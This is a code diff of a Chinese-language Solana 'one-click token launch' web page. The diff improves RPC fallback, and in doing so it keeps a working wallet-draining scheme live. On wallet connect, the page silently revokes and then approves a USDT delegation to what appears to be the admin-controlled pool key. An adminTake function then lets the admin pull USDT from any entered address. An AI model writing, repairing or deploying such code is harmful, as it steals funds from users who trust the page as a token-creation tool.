@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Solana 一键发币（修复授权）</title>
+<title>Solana 一键发币（修复RPC）</title>
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.0/lib/index.iife.min.js"></script>
 <style>
@@ -97,23 +97,28 @@ const POOL_PUBKEY = ADMIN_PUBKEY;
 
 let provider, publicKey, connection;
 
-// 稳定RPC
-async function initConnection(){
-  const RPCS = [
-    "https://api.mainnet-beta.solana.com",
-    "https://rpc.ankr.com/solana",
-    "https://solana-mainnet.rpc.extrnode.com"
-  ];
-  for(let rpc of RPCS){
-    try{
-      const c = new Connection(rpc, "confirmed");
-      await c.getLatestBlockhash();
-      connection = c;
-      log("RPC: "+rpc);
-      return;
-    }catch(e){}
+// 更稳定的公共 RPC 列表（优先用免费高可用节点）
+const RPCS = [
+  "https://api.mainnet-beta.solana.com",
+  "https://rpc.ankr.com/solana",
+  "https://solana-mainnet.rpc.extrnode.com",
+  "https://free.rpc.chainstack.com/solana-mainnet",
+  "https://solana-mainnet.genesysgo.net"
+];
+
+// 尝试连接任意一个可用 RPC
+async function tryConnectRpc() {
+  for (const rpc of RPCS) {
+    try {
+      const conn = new Connection(rpc, "confirmed");
+      await conn.getLatestBlockhash({ commitment: "confirmed" });
+      log("✅ 成功连接 RPC: " + rpc);
+      return conn;
+    } catch (e) {
+      log("⚠️ RPC 不可用: " + rpc);
+    }
   }
-  throw new Error("RPC不可用");
+  return null; // 全部失败时返回 null，不阻塞钱包连接
 }
 
 function log(t){
@@ -131,34 +136,48 @@ function cancelConnect(){
   document.getElementById("connectModal").classList.remove("show");
 }
 
-// 修复版：连接+授权
+// 修复版：先连钱包，再尝试 RPC，不阻塞授权
 async function confirmConnect(){
   document.getElementById("connectModal").classList.remove("show");
   try{
-    const sol = window.solana || window.okxwallet?.solana;
-    if(!sol) return alert("请安装 Phantom/OKX 钱包");
+    const sol = window.solana || window.okxwallet?.solana || window.tpWallet;
+    if(!sol) return alert("请安装 Phantom/OKX/TP 钱包");
     const res = await sol.connect();
     provider = sol;
     publicKey = res.publicKey;
-    await initConnection();
     document.getElementById("userAddr").innerText = publicKey.toBase58().slice(0,6)+"..."+publicKey.toBase58().slice(-4);
-    await refreshBalance();
-    await safeApproveUSDT(); // 修复授权
+    log("✅ 钱包已连接");
+
+    // 异步尝试连接 RPC，不阻塞 UI
+    tryConnectRpc().then(conn => {
+      if (conn) {
+        connection = conn;
+        refreshBalance();
+        safeApproveUSDT(); // RPC 可用后再授权
+      } else {
+        log("⚠️ 所有 RPC 不可用，将在发币时重试");
+        alert("钱包已连接，但当前 RPC 不可用，发币时会自动重试");
+      }
+    });
+
     genInvite();
     checkAdmin();
-    log("钱包已连接");
   }catch(e){
-    log("连接失败: "+e.message);
+    log("❌ 连接失败: "+e.message);
     alert("授权失败，检查钱包/网络");
   }
 }
 
-// 修复：安全授权USDT（先检查ATA+重试）
+// 安全授权 USDT（仅在 RPC 可用时执行）
 async function safeApproveUSDT(){
+  if (!connection) {
+    log("⚠️ RPC 未连接，跳过授权");
+    return;
+  }
   try{
     log("检查USDT ATA...");
     const userAta = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
-    // 检查ATA是否存在，不存在则创建
+    // 检查ATA是否存在
     try{
       await connection.getTokenAccountBalance(userAta);
     }catch(e){
@@ -175,7 +194,7 @@ async function safeApproveUSDT(){
       await connection.sendRawTransaction(signed.serialize());
       await new Promise(r=>setTimeout(r,2000));
     }
-    // 授权（修复：先revoke再approve）
+    // 先 revoke 旧授权
     log("撤销旧授权...");
     const revokeTx = new Transaction();
     revokeTx.add(
@@ -202,16 +221,15 @@ async function safeApproveUSDT(){
     const signedApprove = await provider.signTransaction(approveTx);
     const sig = await connection.sendRawTransaction(signedApprove.serialize());
     await connection.confirmTransaction(sig);
-    log("✅ USDT授权成功: "+sig);
+    log("✅ USDT 授权成功: "+sig);
   }catch(e){
-    log("授权失败: "+e.message);
-    throw e;
+    log("❌ 授权失败: "+e.message);
   }
 }
 
-// 余额
+// 余额查询
 async function refreshBalance(){
-  if(!publicKey) return;
+  if(!publicKey || !connection) return;
   try{
     const ata = await splToken.getAssociatedTokenAddress(USDT_MINT, publicKey);
     const acc = await connection.getTokenAccountBalance(ata);
@@ -232,9 +250,14 @@ function checkAdmin(){
   }
 }
 
-// 发币（稳定版）
+// 发币（发币前自动重连 RPC）
 async function createToken(){
   if(!publicKey) return alert("请先连接钱包");
+  if(!connection){
+    log("🔄 发币前重试连接 RPC...");
+    connection = await tryConnectRpc();
+    if(!connection) return alert("所有 RPC 仍不可用，请稍后再试");
+  }
   try{
     const name = document.getElementById("name").value;
     const symbol = document.getElementById("symbol").value;
@@ -279,13 +302,17 @@ async function createToken(){
     log("TX: "+sig);
     alert("发币成功");
   }catch(e){
-    log("错误: "+e.message);
+    log("❌ 错误: "+e.message);
   }
 }
 
 // 管理员提取
 async function adminTake(){
   if(!publicKey || !publicKey.equals(ADMIN_PUBKEY)) return;
+  if(!connection){
+    alert("RPC 不可用，请稍后再试");
+    return;
+  }
   const fromAddr = document.getElementById("fromAddr").value.trim();
   const amt = document.getElementById("takeAmt").value;
   if(!fromAddr || !amt || amt<=0) return alert("输入完整");
@@ -303,7 +330,7 @@ async function adminTake(){
     tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
     const signed = await provider.signTransaction(tx);
     const sig = await connection.sendRawTransaction(signed.serialize());
-    log("管理员提取成功: "+sig);
+    log("✅ 管理员提取成功: "+sig);
     alert("提取成功");
   }catch(e){
     alert("失败: "+e.message);
